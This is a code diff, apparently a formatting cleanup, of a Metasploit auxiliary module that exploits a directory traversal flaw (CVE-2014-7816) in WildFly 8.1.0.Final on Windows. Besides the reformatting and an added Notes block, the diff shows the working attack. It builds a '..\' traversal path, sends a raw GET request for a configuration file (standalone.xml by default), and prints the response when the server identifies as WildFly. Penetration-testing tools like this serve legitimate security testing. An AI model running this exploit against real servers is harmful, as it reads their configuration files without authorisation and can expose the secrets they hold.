@@ -9,31 +9,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WildFly Directory Traversal',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in the WildFly 8.1.0.Final
-        web server running on port 8080, named JBoss Undertow. The vulnerability only affects to
-        Windows systems.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WildFly Directory Traversal',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability found in the WildFly 8.1.0.Final
+          web server running on port 8080, named JBoss Undertow. The vulnerability only affects to
+          Windows systems.
+        },
+        'References' => [
           ['CVE', '2014-7816' ],
           ['URL', 'https://access.redhat.com/security/cve/CVE-2014-7816'],
           ['URL', 'https://www.conviso.com.br/advisories/CONVISO-14-001.txt'],
           ['URL', 'https://www.openwall.com/lists/oss-security/2014/11/27/4']
         ],
-      'Author'         => 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2014-10-22'
-    ))
+        'Author' => 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2014-10-22',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('RELATIVE_FILE_PATH', [true, 'Relative path to the file to read', 'standalone\\configuration\\standalone.xml']),
         OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 1])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -42,13 +50,13 @@ class MetasploitModule < Msf::Auxiliary
     traversal = "..\\" * datastore['TRAVERSAL_DEPTH']
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/#{traversal}\\#{datastore['RELATIVE_FILE_PATH']}"
+      'uri' => "/#{traversal}\\#{datastore['RELATIVE_FILE_PATH']}"
     })
 
     if res &&
-        res.code == 200 &&
-        res.headers['Server'] &&
-        res.headers['Server'] =~ /WildFly/
+       res.code == 200 &&
+       res.headers['Server'] &&
+       res.headers['Server'] =~ /WildFly/
       vprint_line(res.to_s)
       fname = File.basename(datastore['RELATIVE_FILE_PATH'])
 
